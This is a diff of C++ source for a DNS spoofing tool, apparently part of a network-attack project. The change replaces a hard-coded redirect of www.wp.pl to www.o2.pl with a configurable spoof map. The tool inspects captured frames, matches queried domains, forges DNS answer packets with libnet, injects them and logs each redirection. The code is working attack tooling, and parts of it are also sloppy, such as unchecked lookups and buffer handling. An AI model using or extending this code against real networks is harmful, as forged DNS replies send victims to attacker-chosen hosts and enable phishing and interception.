@@ -1,10 +1,37 @@
-#include "dns_spoofer.h"
 #include <linux/if_ether.h>
-
 #include <linux/if_arp.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
 #include <linux/udp.h>
+
+#include <string>
+#include <map>
+#include <iostream>
+
+#include "dns_spoofer.h"
+#include "../helper.h"
+
+std::string getSpoofedAddressForThisSite(char *questionedSite) {
+    std::string questionedAddressString(questionedSite);
+    char dotArray[] = {'\u0002', '\u0003', '\u0004', '.'};
+    std::map<std::string, std::string>::iterator it;
+    std::shared_ptr<std::map<std::string, std::string>> spoofMap = getSpoofMap();
+    for (it = spoofMap->begin(); it != spoofMap->end(); it++ ) {
+        std::size_t found = questionedAddressString.find(it->first);    // find domain in questionedAddress
+        if (found == std::string::npos) continue;
+        for (char &beginDot : dotArray) {
+            for (char &endDot : dotArray) {
+                std::stringstream str;
+                str << beginDot << it->first << endDot;
+                found = questionedAddressString.find(str.str());        // find domain with dots in questionedAddress
+                if (found != std::string::npos) {
+                    return it->second;
+                }
+            }
+        }
+    }
+    return "";
+}
 
 bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
     auto *eth_hdr = (struct ethhdr *) frame;
@@ -26,24 +53,19 @@ bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
 
                 char *dns_query = (char *) (frame + header_size);
                 int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end
+
                 char questionedAddress[dns_query_size];
                 strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
+                std::string spoofedSite = getSpoofedAddressForThisSite(questionedAddress);
+                if (spoofedSite.compare("") != 0) {
 
-                char cmp_questioned_address[] = " www.wp.pl"; // TODO z konfiguracji
-                cmp_questioned_address[0] = 3;
-                cmp_questioned_address[4] = 2;
-                cmp_questioned_address[7] = 2;
-
-
-                if (strcmp(questionedAddress, cmp_questioned_address) == 0) {
-
-                    struct hostent *addrent = gethostbyname("www.o2.pl"); // TODO z konfiguracji
+                    struct hostent *addrent = gethostbyname(spoofedSite.c_str());
                     if (addrent->h_length != 4) {
                         printf("%s", "ERROR!");
                     }
-                    struct dns_answer answer = dns_answer(*(uint32_t *) addrent->h_addr_list[0]);
 
-                    char *a = reinterpret_cast<char *>(&answer);
+                    struct dns_answer answer = dns_answer((unsigned char*)addrent->h_addr);
+
                     u_int32_t datalen = dns_query_size + sizeof(struct QUESTION) + DNS_ANSWER_SIZE;
                     u_int8_t *data = (u_int8_t *) (malloc(datalen));
 
@@ -65,12 +87,16 @@ bool handle_dns_spoofing(const u_char *frame, char *interface_name) {
                     );
 
                     libnet_write(ln);
+                    unsigned char* address = (unsigned char*) addrent->h_addr;
+                    std::cout << questionedAddress << " -> " << spoofedSite
+                              <<" (" << (int)address[0] << "." <<(int)address[1] << "."
+                              << (int)address[2] << "." << (int)address[3] << ")\n";
                     return true;
                 }
             }
         }
-        return false;
     }
+    return false;
 }
 
 void libnet_build_dns_spoof(__be32 source_ip,
